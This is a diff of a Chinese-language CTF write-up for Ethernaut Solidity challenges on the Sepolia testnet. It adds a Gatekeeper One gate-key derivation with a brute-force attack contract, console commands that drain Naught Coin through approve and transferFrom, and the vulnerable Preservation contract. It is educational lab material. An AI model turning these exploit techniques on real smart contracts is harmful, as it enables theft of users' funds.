@@ -618,7 +618,8 @@ contract Attacker is Building {
 }
 ```
 
-# 13 Gatekeeper One
+
+# 13 Privacy
 
 通过脚本扫描slot 
 
@@ -680,7 +681,8 @@ Solidity 的存储是基于 32 字节的存储槽模型。每个槽能够容纳�
 如果多个状态变量的大小之和小于或等于 32 字节（例如，bool、uint8、uint16 等），它们将被打包在同一个存储槽中。
 如果一个状态变量不能完全打包到当前的存储槽中（例如，它是一个 uint256 或 bytes32 类型），它将被存储在一个新的存储槽中。
 
-# 14 Gatekeeper Two
+
+# 14 Gatekeeper One
 
 ```
 // SPDX-License-Identifier: MIT
@@ -709,6 +711,148 @@ contract GatekeeperOne {
     function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
+    }
+}
+```
+
+enter前面使用了三个modifier，gateOne、gateTwo 和 gateThree。这些 modifier 会在 enter 函数执行之前执行，以确保满足一些条件。
+
+gateOne: 需要中间合约调用
+gateTwo: 需要 gasleft() % 8191 == 0 
+ - 这里选择直接 bruteforce，也可以通过remix debug的方式找到正确的gasleft或者减少bruteforce的范围
+
+gateThree: 需要 _gateKey 满足三个条件, 需要仔细分析
+
+用B1-B8表示_gateKey的8个字节
+1. require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+0x B5 B6 B7 B8 = 0 x 00 00 B7 B8,
+
+Hence B5 = 0, B6 = 0
+
+2. require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+
+0x 00 00 00 00 B5 B6 B7 B8 != 0 x B1 B2 B3 B4 B5 B6 B7 B8
+
+B1, B2, B3, B4 != 0
+
+3. require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+
+0x B5 B6 B7 B8 == 0x 00 00 last 2 bytes of tx.origin
+
+B7 B8 = last 2 bytes of tx.origin
+
+hence gate key = 0x Any Any Any Any 00 00 last 2 bytes of tx.origin
+
+bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF
+
+
+编写攻击合约
+
+```
+pragma solidity ^0.8.0;
+
+contract GatekeeperOneAttack {
+    address public victim;
+
+    constructor(address _victim) {
+        victim = _victim;
+    }
+
+    function attack() external {
+        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF; 
+        for (uint256 i = 0; i <= 8191; i++) {
+            (bool success, ) = address(victim).call{gas: 8191 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+            if (success) {
+                break;
+            }
+        }
+    }
+}
+
+```
+
+检查slot
+
+Connected to Sepolia test network
+Contract Balance: 0 ETH
+Transaction Count: 1
+Contract Code exists, this is a contract address.
+Storage at slot 0: 0x000000000000000000000000e5107dee9ccc8054210ff6129ce15eaa5bbcb1c0
+
+submit instance
+
+# 15 Gatekeeper Two
+
+2024-09-04 暂时跳过
+```
+```
+
+# 16 Naught Coin
+
+这个题目要求我们绕过transfer函数的限制来进行ERC20的代币转账，合约使用了OpenZeppelin的ERC20模版。
+
+查看contract abi发现Approve可以使用，可以通过approve来绕过transfer的限制
+
+receiver = "0xd262Cd4eecF8Db4D44024CF1F892ee8D634B25Ae"
+'0xd262Cd4eecF8Db4D44024CF1F892ee8D634B25Ae'
+
+balance = await contract.balanceOf(player)
+balance.toString()
+'1000000000000000000000000'
+
+执行approve
+await contract.approve(receiver, '1000000000000000000000000')
+
+allowance = await contract.allowance(player, receiver)
+allowance.toString()
+'1000000000000000000000000'
+
+使用transferFrom来转账
+await contract.transferFrom(player, receiver, '1000000000000000000000000')
+
+https://sepolia.etherscan.io/tx/0x95b58b47f9552fe64003d01f63e9e772add4f001110313ff8f5eed9526f29ea6
+
+submit instance
+
+# 17 Preservation
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
     }
 }
 ```
